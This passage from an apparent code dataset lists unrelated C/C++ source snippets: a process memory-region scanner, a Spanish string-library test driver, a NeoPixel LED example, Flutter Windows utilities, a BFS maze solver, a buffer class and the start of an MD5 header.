nullptr)\r\n\t\t\tmem_addresses = (mem_info_s*)malloc(MAX_MEM_AMOUNT * sizeof(mem_info_s));\r\n\r\n\t\tbuck_mem_size = 0;\r\n\t\tmem_amount = 0;\r\n\r\n\t\tMEMORY_BASIC_INFORMATION mem_info;\r\n\t\tvoid* next_scan_start = nullptr;\r\n\r\n\t\twhile (VirtualQueryEx(proc, next_scan_start, &mem_info, sizeof(MEMORY_BASIC_INFORMATION)))\r\n\t\t{\r\n\t\t\tnext_scan_start = (char*)mem_info.BaseAddress + mem_info.RegionSize;\r\n\r\n\t\t\tif (mem_info.State == MEM_COMMIT && next_scan_start < (void*)0x00007FF000000000)\r\n\t\t\t{\r\n\t\t\t\tif (mem_info.RegionSize > app_mem_size)\r\n\t\t\t\t\tbuck_mem_size++;\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tmem_addresses[mem_amount].is_priorited = (mem_info.BaseAddress == mem_i",
    "#ifndef _MAIN\r\n#define _MAIN\r\n\r\n#include <iostream>\r\n#include \"biblioteca/funciones/strings.hpp\"\r\n#include \"biblioteca/funciones/tokens.hpp\"\r\n#include \"biblioteca/funciones/files.hpp\"\r\n#include \"biblioteca/tads/parte2/Array.hpp\"\r\n#include \"biblioteca/tads/parte2/Map.hpp\"\r\n#include \"biblioteca/tads/parte2/List.hpp\"\r\n#include \"biblioteca/tads/parte2/Stack.hpp\"\r\n#include \"biblioteca/tads/parte2/Queue.hpp\"\r\n#include \"biblioteca/tads/parte1/Coll.hpp\"\r\n#include \"biblioteca/tads/parte1/MultidimColl.hpp\"\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n   /*\r\n      cout<< length(\"Pirulito\")<<endl;\r\n      tutorial  1+i\r\n      cout<< charCount(\"Apap.ku 6apa\", 'x');\r\n\r\n      string s=\"patata en casa en arg\";\r\n\r\n      cout<< substring(s,2,length(s))<<endl;\r\n      //cout<< substring(s,5)<<endl;\r\n\r\n      int p = indexOf(s,'c');\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,'a',5);\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"en\");\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"ta\",3);\r\n      cout << p << endl;\r\n\r\n      int p = lastIndexOf(s,'e');\r\n      cout << p << endl;\r\n\r\n      char palabrita='D';\r\n        int valor= charToInt(palabrita);\r\n        cout << valor << endl;\r\n\r\n      int numerito=65;\r\n      char letrita= intToChar(numerito);\r\n      cout << letrita << endl;\r\n\r\n      int numerote=4587412;\r\n      int posicion=0;\r\n      int digito= getDigit(numerote,posicion);\r\n      cout<< digito<<endl;\r\n\r\n      int digitocontador= digitCount(numerote);\r\n      cout<< digitocontador<<endl;\r\n\r\n      int numero=123;\r\n      string resultado = intToString(numero);\r\n      cout<<resultado<<endl;\r\n\r\n      int b=16;\r\n      string cadenaStringtoInt =\"12AB\"; //Ingresar binarios decimal o hexa\r\n      int iStringtoint= stringToInt(cadenaStringtoInt,b);\r\n      cout<<iStringtoint<<endl;\r\n\r\n      string ssobrecar=\"12323\";\r\n      int istringtoubtsobre= stringToInt(ssobrecar);\r\n      cout<<istringtoubtsobre<<endl;\r\n\r\n      char cchartistring = ' ';\r\n      string sChartostring = charToString(cchartistring);\r\n      cout << sChartostring << endl; // muestra: A\r\n      cout << length(sChartostring) << endl; // muestra: 1\r\n        return 0;\r\n\r\n      string sStringtochar = \" \";\r\n      char cstringtochar = stringToChar(sStringtochar);\r\n      cout << cstringtochar << endl; // muestra: A\r\n      cout << (int)cstringtochar << endl; // muestra: 65\r\n\r\n      string s = \"10\";\r\n      int i = stringToInt(s,10);\r\n      cout << i << endl;\r\n      int i = stringToInt(s);\r\n      cout << i << endl;\r\n\r\n      string s = stringToString(\"Hola\");\r\n      cout << s << endl;\r\n\r\n      double d = 123.4;\r\n      string s = doubleToString(d);\r\n      cout << s << endl;\r\n\r\n      string s = \"123.4\";\r\n      double d = stringToDouble(s);\r\n      cout << d << endl;\r\n\r\n      string s = \"\";\r\n      cout << isEmpty(s) << endl;\r\n\r\n      string s1 = \"cursoDeAlgoritmos\";\r\n      string s2 = \"c\";\r\n      if( startsWith(s1,s2) )\r\n      {\r\n         cout << s2 << \" es prefijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es prefijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s1 = \"curso de patatas\";\r\n      string s2 = \"patatas\";\r\n      if( endsWith(s1,s2) )\r\n      {\r\n      cout << s2 << \" es sufijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es sufijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s = \"abcd\";\r\n      char c = 'a';\r\n      if( contains(s,c) )\r\n      {\r\n         cout << s << \" contiene a: \" << c << endl;\r\n      }\r\n      else\r\n      {\r\n         cout << s << \" NO contiene a: \" << c << endl;\r\n      }\r\n\r\n      string s = \"Esto es una prueba\";\r\n      string r = replace(s,'e','X');\r\n      cout << r << endl;\r\n\r\n      string s = \"Esto es una prueba\";\r\n      int pos = 4;\r\n      char c = 'X';\r\n      string r = insertAt(s,pos,c);\r\n      cout << r << endl;\r\n\r\n      int n = 5;\r\n      string r = spaces(n);\r\n      // muestra: [ ] (cinco espacios)\r\n      cout << \"[\" << r << \"]\" << endl;\r\n\r\n   char c = '3';\r\n   if( isDigit(c) )\r\n   {\r\n   cout << c << \" es digito\" << endl;\r\n   }\r\n   else\r\n   {\r\n   cout << c << \" NO es digito\" << endl;\r\n   }\r\n\r\n   char c = 'X';\r\n   if( isLetter(c) )\r\n   {\r\n   cout << c << \" es letra\" << endl; // SALIDA\r\n   }\r\n   else\r\n   {\r\n      cout << c << \" NO es letra\" << endl;\r\n   }\r\n  }\r\n\r\n   string s1 = \"Pablo\";\r\n   string s2 = \"Queso\";\r\n   if( cmpString(s1,s2)<0 )\r\n   {\r\n   cout << s1 << \" es menor que: \" << s2 << endl;\r\n   }\r\n   else if(cmpString(s1,s2)>0){\r\n   cout << s1 << \" es mayor que: \" << s2 << endl;\r\n   }\r\n   else{\r\n   cout << s1 << \" es igual que: \" << s2 << endl;\r\n   }\r\n\r\n   double x = 25.7;\r\n   double y = 36.9;\r\n   if( cmpDouble(x,y)<0 )\r\n   {\r\n   cout << x << \" es menor que: \" << y << endl;\r\n   }\r\n   else if(cmpDouble(x,y)>0){\r\n      cout << x << \" es mayor que: \" << y << endl;\r\n      }\r\n   else{\r\n      cout << x << \" es igual que: \" << y << endl;\r\n     }\r\n\r\n   char c = 'n';\r\n   char r = toUpperCase(c);\r\n   cout << r << endl;\r\n   }\r\n\r\n   char c = 'n';\r\n   char r = toLowerCase(c);\r\n   cout << r << endl;\r\n\r\n   string s = \"",
    "/**\r\n * This is the more completely documented example! (see below)\r\n */\r\n\r\n/* ======================= includes ================================= */\r\n\r\n#include \"Particle.h\"\r\n#include \"neopixel.h\"\r\n\r\n/* ======================= prototypes =============================== */\r\n\r\nvoid colorAll(uint32_t c, uint16_t wait);\r\nvoid colorWipe(uint32_t c, uint8_t wait);\r\nvoid rainbow(uint8_t wait);\r\nvoid rainbowCycle(uint8_t wait);\r\nuint32_t Wheel(byte WheelPos);\r\n\r\n/* ======================= extra-examples.cpp ======================== */\r\n\r\nSYSTEM_MODE(AUTOMATIC);\r\n\r\n// IMPORTANT: Set pixel COUNT, PIN and TYPE\r\n#if (PLATFORM_ID == 32)\r\n// MOSI pin MO\r\n#define PIXEL_PIN SPI\r\n// MOSI pin D2\r\n// #define PIXEL_PIN SPI1\r\n#else // #if (PLATFORM_ID == 32)\r\n#define PIXEL_PIN D3\r\n#endif\r\n#define PIXEL_COUNT 11\r\n#define PIXEL_TYPE WS2812B\r\n\r\n// Parameter 1 = number of pixels in strip\r\n//               note: for some stripes like those with the TM1829, you\r\n//                     need to count the number of segments, i.e. the\r\n//                     number of controllers in your stripe, not the number\r\n//                     of individual LEDs!\r\n//\r\n// Parameter 2 = pin number (if not specified, D2 is selected for you)\r\n//\r\n//               On Photon, Electron, P1, Core and Duo, any pin can be used for Neopixel.\r\n//\r\n//               On the Argon, Boron and Xenon, only these pins can be used for Neopixel:\r\n//               - D2, D3, A4, A5\r\n//               - D4, D6, D7, D8\r\n//               - A0, A1, A2, A3\r\n//\r\n//               In addition on the Argon/Boron/Xenon, only one pin per group can be used\r\n//               at a time. So it's OK to have one Adafruit_NeoPixel instance on pin D2 and\r\n//               another one on pin A2, but it's not possible to have one on pin A0 and\r\n//               another one on pin A1.\r\n//\r\n//               On Photon 2 / P2, only SPI(MOSI) or SPI1(D2) can be used for Neopixel,\r\n//               and only PIXEL_TYPE's WS2812, WS2812B, WS2813 are supported.\r\n//               - MISO (D12), SCK (D13) and SS (D8) can be used as GPIO when using SPI\r\n//               - MISO1 (D3), SCK1 (D4) and SS1 (D5) can be used and GPIO when using SPI1\r\n//               note: You may want to call System.disableFeature(FEATURE_ETHERNET_DETECTION);\r\n//                     to disable automatic Ethernet driver detection, which will cause some\r\n//                     glitches to SPI1 pins D2,D3,D4.\r\n//\r\n// Parameter 3 = pixel type [ WS2812, WS2812B, WS2812B2, WS2813, WS2811,\r\n//                            TM1803, TM1829, SK6812RGBW, WS2812B_FAST,\r\n//                            WS2812B2_FAST ]\r\n//               note: if not specified, WS2812B is selected for you which\r\n//                     is the same as WS2812 or WS2813 in operation.\r\n//               note: RGB order is automatically applied to WS2811,\r\n//                     WS2812/WS2812B/WS2812B2/WS2813/TM1803 is GRB order.\r\n//               note: For legacy 50us reset pulse timing on WS2812/WS2812B\r\n//                     or WS2812B2, select WS2812B_FAST or WS2812B2_FAST\r\n//                     respectively.  Otherwise 300us timing will be used.\r\n//\r\n// 800 KHz bitstream 800 KHz bitstream (most NeoPixel products\r\n//               WS2812/WS2813 (6-pin part)/WS2812B (4-pin part)/SK6812RGBW (RGB+W) )\r\n//\r\n// 400 KHz bitstream (classic 'v1' (not v2) FLORA pixels, WS2811 drivers)\r\n//                   (Radio Shack Tri-Color LED Strip - TM1803 driver\r\n//                    NOTE: RS Tri-Color LED's are grouped in sets of 3)\r\n\r\nAdafruit_NeoPixel strip(PIXEL_COUNT, PIXEL_PIN, PIXEL_TYPE);\r\n\r\n// IMPORTANT: To reduce NeoPixel burnout risk, add 1000 uF capacitor across\r\n// pixel power leads, add 300 - 500 Ohm resistor on first pixel's data input\r\n// and minimize distance between Arduino and first pixel.  Avoid connecting\r\n// on a live circuit...if you must, connect GND first.\r\n\r\nvoid setup() {\r\n  strip.begin();\r\n  strip.show(); // Initialize all pixels to 'off'\r\n}\r\n\r\nvoid loop() {\r\n  // Some example procedures showing how to display to the pixels:\r\n  // Do not run more than 15 seconds of these, or the b/g tasks\r\n  // will be blocked.\r\n  //--------------------------------------------------------------\r\n\r\n  colorWipe(strip.Color(0, 255, 255), 40); // Cyan\r\n  colorWipe(strip.Color(255, 0, 0), 35);   // Red\r\n  colorWipe(strip.Color(0, 255, 0), 30);   // Green\r\n  colorWipe(strip.Color(0, 0, 255), 25);   // Blue\r\n  colorWipe(strip.Color(255, 0, 255), 20); // Magenta\r\n\r\n  rainbowCycle(20);\r\n\r\n  colorAll(strip.Color(255, 0, 0), 900);   // Red\r\n  colorAll(strip.Color(0, 255, 0), 1000);  // Green\r\n  colorAll(strip.Color(0, 0, 255), 800);   // Blue\r\n  colorAll(strip.Color(255, 0, 255), 700); // Magenta\r\n\r\n  rainbow(15);\r\n}\r\n\r\n// Set all pixels in the strip to a solid color, then wait (ms)\r\nvoid colorAll(uint32_t c, uint16_t wait) {\r\n  uint16_t i;\r\n\r\n  for(i=0; i<strip.numPixels(); i++) {\r\n    strip.setPixelColor(i, c);\r\n  }\r\n  strip.show();\r\n  delay(wait);\r\n}\r\n\r\n// Fill the dots one aft",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n#define MAX 8\r\n\r\ntypedef struct {\r\n    int x;\r\n    int y;\r\n} Node;\r\n\r\nint maze[MAX][MAX] = {\r\n    {0, 0, 0, 0, 0, 0, 0, 0},\r\n    {0, 1, 1, 1, 1, 0, 1, 0},\r\n    {0, 0, 0, 0, 1, 0, 1, 0},\r\n    {0, 1, 0, 0, 0, 0, 1, 0},\r\n    {0, 1, 0, 1, 1, 0, 1, 0},\r\n    {0, 1, 0, 0, 0, 0, 1, 1},\r\n    {0, 1, 0, 0, 1, 0, 0, 0},\r\n    {0, 1, 1, 1, 1, 1, 1, 0}\r\n};\r\n\r\nint vis[MAX][MAX];\r\nint px[MAX][MAX], py[MAX][MAX];\r\n\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\n// \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u904d\u5386\u8ff7\u5bab\r\nvoid bfs(int x, int y)\r\n{\r\n    if (x == MAX - 1 && y == MAX - 1)\r\n    {\r\n        Node ans[MAX * MAX];\r\n        int size = 0;\r\n\r\n        while (x != 0 || y != 0)\r\n        {\r\n            ans[size].x = x;  // \u4fdd\u5b58\u8def\u5f84\u4e0a\u7684 x \u5750\u6807\r\n            ans[size].y = y;  // \u4fdd\u5b58\u8def\u5f84\u4e0a\u7684 y \u5750\u6807\r\n            size++;\r\n\r\n            int tx = px[x][y], ty = py[x][y];\r\n            x = tx, y = ty;  // \u56de\u6eaf\u5230\u4e0a\u4e00\u4e2a\u8282\u70b9\r\n        }\r\n        printf(\"\u8ff7\u5bab\u7684\u4e00\u6761\u8def\u5f84:\\n\");\r\n        printf(\"(0,0)\");\r\n        for (int i = size - 1; i >= 0; i--)\r\n        {\r\n            printf(\"->(%d,%d)\", ans[i].x, ans[i].y);  // \u9006\u5e8f\u8f93\u51fa\u8def\u5f84\u4e0a\u7684\u5750\u6807\r\n        }\r\n        printf(\"\\n\");\r\n\r\n        return;\r\n    }\r\n\r\n    vis[x][y] = 1;  // \u6807\u8bb0\u5f53\u524d\u8282\u70b9\u4e3a\u5df2\u8bbf\u95ee\r\n\r\n    for (int i = 0; i < 4; i++)\r\n    {\r\n        int xx = x + dx[i], yy = y + dy[i];  // \u8ba1\u7b97\u76f8\u90bb\u8282\u70b9\u7684\u5750\u6807\r\n\r\n        if (xx >= 0 && xx < MAX && yy >= 0 && yy < MAX && !vis[xx][yy] && maze[xx][yy] != 1)\r\n        {\r\n            px[xx][yy] = x;  // \u8bb0\u5f55\u8def\u5f84\u4e0a\u7684 x \u5750\u6807\r\n            py[xx][yy] = y;  // \u8bb0\u5f55\u8def\u5f84\u4e0a\u7684 y \u5750\u6807\r\n            bfs(xx, yy);  // \u9012\u5f52\u8bbf\u95ee\u76f8\u90bb\u8282\u70b9\r\n        }\r\n    }\r\n}\r\n\r\n\r\n// \u6253\u5370\u5e26\u6709\u8def\u5f84\u7684\u8ff7\u5bab\r\nvoid PrintMaze()\r\n{\r\n    printf(\"\u8ff7\u5bab\u8def\u5f84\u53ef\u89c6\u5316:\\n\");\r\n    for (int i = 0; i < MAX; i++) {\r\n        for (int j = 0; j < MAX; j++) {\r\n            if (maze[i][j] == 1) {\r\n                printf(\"* \");  // \u5899\u58c1\r\n            } else if (i == 0 && j == 0) {\r\n                printf(\"S \");  // \u8d77\u70b9\r\n            } else if (i == MAX - 1 && j == MAX - 1) {\r\n                printf(\"E \");  // \u7ec8\u70b9\r\n            } else {\r\n                int isPath = 0;  // \u662f\u5426\u4e3a\u8def\u5f84\u4e0a\u7684\u70b9\r\n                int x = MAX - 1, y = MAX - 1;\r\n                while (x != 0 || y != 0) {\r\n                    if (px[x][y] == i && py[x][y] == j) {\r\n                        printf(\"P \");  // \u8def\u5f84\u4e0a\u7684\u70b9\r\n                        isPath = 1;\r\n                        break;\r\n                    }\r\n                    int tempX = px[x][y];  // \u4fdd\u5b58\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 x \u5750\u6807\r\n                    int tempY = py[x][y];  // \u4fdd\u5b58\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 y \u5750\u6807\r\n                    x = tempX;  // \u66f4\u65b0\u5f53\u524d\u8282\u70b9\u7684 x \u5750\u6807\u4e3a\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 x \u5750\u6807\r\n                    y = tempY;  // \u66f4\u65b0\u5f53\u524d\u8282\u70b9\u7684 y \u5750\u6807\u4e3a\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 y \u5750\u6807\r\n                }\r\n                if (!isPath) {\r\n                    printf(\"0 \");  // \u53ef\u884c\u8def\u5f84\r\n                }\r\n            }\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nint main() {\r\n    printf(\"\u8ff7\u5bab:\\n\");\r\n    for (int i = 0; i < MAX; i++) {\r\n        for (int j = 0; j < MAX; j++) {\r\n            printf(\"%d \", maze[i][j]);\r\n        }\r\n        printf(\"\\n\");\r\n    }\r\n    printf(\"\\n\");\r\n\r\n    memset(vis, 0, sizeof(vis));\r\n    memset(px, -1, sizeof(px));\r\n    memset(py, -1, sizeof(py));\r\n\r\n    bfs(0, 0);\r\n    printf(\"\\n\");\r\n\r\n    PrintMaze();\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "/**\n * @file buffer.cpp\n * @author {gangx} ({gangx6906@gmail.com})\n * @brief \n * @version 0.1\n * @date 2024-05-03\n * \n * @copyright Copyright (c) 2024\n * \n */\n#include \"buffer.hpp\"\n#include <cassert>\n#include <cstddef>\n#include <sys/types.h>\n#include <unistd.h>\n#include <cstring>\n#include \"sys/uio.h\"\n#include <iostream>\nBuffer::Buffer(size_t initBufferSize):buffer_(initBufferSize),read_pos_(0),write_pos_(0){\n\n}\nsize_t Buffer::ReadableBytes() const{\n    return write_pos_ - read_pos_;//\u8fd4\u56de\u53ef\u4ee5\u5199\u7684\u4f4d\u7f6e\u548c\u8bfb\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u957f\u5ea6\n}\n\nsize_t Buffer::WriteableBytes() const{\n    return buffer_.size() - write_pos_;//\u8fd4\u56de\u73b0\u5728\u7f13\u5b58\u7684\u5927\u5c0f\u51cf\u53bb\u5199\u5165\u7684\u4f4d\u7f6e\n}\n\nsize_t Buffer::PrependableBytes() const{\n    return read_pos_;//\u8fd4\u56de\u8bfb\u53d6\u7684\u4f4d\u7f6e\n}\nconst char* Buffer::Peek() const{\n    return BeginPtr_() + read_pos_;//\u8fd4\u56de\u7f13\u5b58\u5f00\u59cb\u5730\u5740\u52a0\u4e0a\u8bfb\u53d6\u7684\u4f4d\u7f6e\n}\n\nvoid Buffer::Retrieve(size_t len){\n    assert(len <= ReadableBytes());//\u68c0\u67e5\u662f\u5426\u8d8a\u754c\n    read_pos_ += len;//\u66f4\u65b0\u8bfb\u53d6\u4f4d\u7f6e\n}\n\nvoid Buffer::RetrieveUntil(const char* end){\n    assert(Peek() <= end);//\u68c0\u67e5\u53c2\u6570\u662f\u5426\u5728\u5f53\u524d\u4f4d\u7f6e\u4e4b\u524d\n    Retrieve(end - Peek());\n}\n\nvoid Buffer::RetrieveAll(){\n    bzero(&buffer_[0], buffer_.size());//\u6e05\u7a7a\u7f13\u5b58\u7684\u5185\u5bb9\n    //\u521d\u59cb\u5316\u8bfb\u5199\u4f4d\u7f6e\n    read_pos_ = 0;\n    write_pos_ = 0;\n}\n\nstd::string Buffer::RetrieveAllToStr(){\n    std::string str(Peek(),ReadableBytes());//\u521b\u5efa\u7f13\u51b2\u5269\u4f59\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\n    RetrieveAll();//\u6e05\u7a7a\u7f13\u51b2\n    return str;\n}\n\nconst char* Buffer::BeginWriteConst() const{\n    return BeginPtr_() + write_pos_;//\u83b7\u53d6\u5199\u4f4d\u7f6e\u7684\u6307\u9488\n}\n\nchar* Buffer::BeginWrite(){\n    return BeginPtr_() + write_pos_;//\u83b7\u53d6\u5199\u4f4d\u7f6e\u7684\u6307\u9488\n}\n\nvoid Buffer::HasWritten(size_t len){\n    write_pos_ += len;//\u5df2\u7ecf\u5199\u5165\u4fee\u6539\u5199\u7684\u4f4d\u7f6e\n}\n\nvoid Buffer::Append(const std::string& str){\n    Append(str.data(),str.size());//\u6dfb\u52a0\u5b57\u7b26\u4e32\u5230\u7f13\u5b58\n}\n\nvoid Buffer::Append(const char* str,size_t len){\n    assert(str);//\u65ad\u8a00\u5224\u65ad\n    EnsureWriteable(len);//\u786e\u4fdd\u7f13\u5b58\u7a7a\u95f4\u8db3\u591f\u5199\u5165\n    std::copy(str,str + len, BeginWrite());//\u62f7\u8d1d\u5b57\u7b26\u4e32\u5230\u7f13\u5b58\u5199\u5165\u7684\u5f00\u59cb\u5730\u5740\n    HasWritten(len);//\u5df2\u7ecf\u5199\u5165\u4fee\u6539\u5199\u5165\u4f4d\u7f6e\n}\n\nvoid Buffer::Append(const void* data,size_t len){\n    assert(data);//\u65ad\u8a00\u5224\u65ad\n    Append(static_cast<const char*>(data),len);//\u8f6c\u6362\u4e3a\u5b57\u7b26\u6307\u9488\u8fdb\u884c\u5199\u5165\n}\n\nvoid Buffer::Append(const Buffer& buff){\n    Append(buff.Peek(),buff.ReadableBytes());\n}\n\nvoid Buffer::EnsureWriteable(size_t len){\n    if(WriteableBytes() < len){//\u53ef\u4ee5\u5199\u5165\u7684\u957f\u5ea6\u5c0f\u5c31\u8fdb\u884c\u6269\u5bb9\n        MakeSpace_(len);\n    }\n    assert(WriteableBytes() >= len);//\u65ad\u8a00\u5224\u65ad\u6269\u5bb9\u4e4b\u540e\u7684\u53ef\u5199\u957f\u5ea6\u8db3\u591f\n}\n\nssize_t Buffer::ReadFd(int fd,int* savedErrno){\n    char buff[65536];\n    struct iovec iov[2];\n    const size_t writable = WriteableBytes();\n    /**\u8fdb\u884cIO\u8bfb\u5199\u7684\u5206\u6563**/\n    iov[0].iov_base = BeginPtr_() + write_pos_;//\u5199\u5165\u4f4d\u7f6e\u7684\u6307\u9488\u4f5c\u4e3a\u7f13\u5b58\u5f00\u59cb\n    iov[0].iov_len = writable;\n    iov[1].iov_base = buff;//\u4ee5\u7f13\u5b58\u7c7b\u7684\u5f00\u59cb\u4f5c\u4e3a\u5f00\u59cb\n    iov[1].iov_len = sizeof(buff);\n    const ssize_t len = readv(fd,iov,2);//\u5206\u805a\u8bfb\u53d6\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u5185\u5bb9\u5230\n    if(len < 0){//\u5224\u65ad\u662f\u5426\u8bfb\u53d6\u9519\u8bef\n        *savedErrno = errno;\n    }else if(static_cast<size_t>(len) <= writable){//\u8bfb\u53d6\u7684\u5185\u5bb9\u5168\u90e8\u5230\u4e86\u7f13\u5b58\u7c7b\u91cc\u9762\u4e86\n        write_pos_ += len;\n    }else{//\u6709\u6570\u636e\u8bfb\u53d6\u5230\u4e86\u4e34\u65f6\u7684\u7f13\u5b58\u53d8\u91cf\u91cc\u9762\u4e86\n        write_pos_ = buffer_.size();\n        Append(buff,len - writable);\n    }\n    return len;\n}   \n\nssize_t Buffer::WriteFd(int fd,int* savedErrno){\n    size_t read_size = ReadableBytes();//\u83b7\u53d6\u53ef\u4ee5\u8bfb\u53d6\u7f13\u5b58\u7684\u957f\u5ea6\n    ssize_t len = write(fd,Peek(),read_size);//\u628a\u7f13\u5b58\u5185\u5bb9\u5199\u5165\u5230\u6587\u4ef6\n    if(len <= 0){//\u5199\u5165\u5931\u8d25\n        *savedErrno = errno;\n        return len;\n    }\n    read_pos_ += len;//\u8bfb\u53d6\u4f4d\u7f6e\u4fee\u6539\n    return len;\n}\n\nssize_t Buffer::ReadFile(FILE *fp) {     \n    char buff[65536];\n    int index = 0;\n    while (true)\n    {\n        int character = fgetc(fp);\n        if(character==EOF){\n            break;\n        }\n        buff[index++] = character;\n    }\n    Append(buff,index); \n    return index;\n}\n\nssize_t Buffer::WriteFile(FILE *fp) { \n    size_t write_size =  fwrite(BeginPtr_()+write_pos_,1,ReadableBytes(),fp);\n    return write_size;\n }\n\n char *Buffer::BeginPtr_() { return &*buffer_.begin(); }\n\n const char *Buffer::BeginPtr_() const { return &*buffer_.begin(); }\n\n void Buffer::MakeSpace_(size_t len) {\n   if (WriteableBytes() + PrependableBytes() <\n       len) { // \u7f13\u5b58\u6574\u4e2a\u7684\u7a7a\u95f4\u4e0d\u8db3\u5c31\u8003\u8651\u6269\u5bb9\n     buffer_.resize(write_pos_ + len);\n   } else { // \u7f13\u5b58\u7684\u7a7a\u95f4\u8db3\u591f\u5c31\u8fdb\u884c\u6570\u636e\u7684\u79fb\u52a8\n     size_t readable = ReadableBytes();\n     std::copy(BeginPtr_() + read_pos_, BeginPtr_() + write_pos_,\n               BeginPtr_());            // \u62f7\u8d1d\u6570\u636e\u5230\u7f13\u5b58\u7684\u5f00\u59cb\n     read_pos_ = 0;                     // \u8bfb\u53d6\u4f4d\u7f6e\u5f52\u96f6\n     write_pos_ = read_pos_ + readable; // \u5199\u5165\u4f4d\u7f6e\u4e3a\u5f53\u524d\u7f13\u5b58\u6570\u636e\u7684\u957f\u5ea6\n   }\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* Copyright (c) 2021 OceanBase and/or its affiliates. All rights reserved.\nminiob is licensed under Mulan PSL v2.\nYou can use this software according to the terms and conditions of the Mulan PSL v2.\nYou may obtain a copy of Mulan PSL v2 at:\n         http://license.coscl.org.cn/MulanPSL2\nTHIS SOFTWARE IS PROVIDED ON AN \"AS IS\" BASIS, WITHOUT WARRANTIES OF ANY KIND,\nEITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT,\nMERCHANTABILITY OR FIT FOR A PARTICULAR PURPOSE.\nSee the Mulan PSL v2 for more details. */\n\n//\n// Created by Longda on 2010\n//\n\n#include \"common/math/md5.h\"\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nnamespace common {\n\n#define S11 7\n#define S12 12\n#define S13 17\n#define S14 22\n#define S21 5\n#define S22 9\n#define S23 14\n#define S24 20\n#define S31 4\n#define S32 11\n#define S33 16\n#define S34 23\n#define 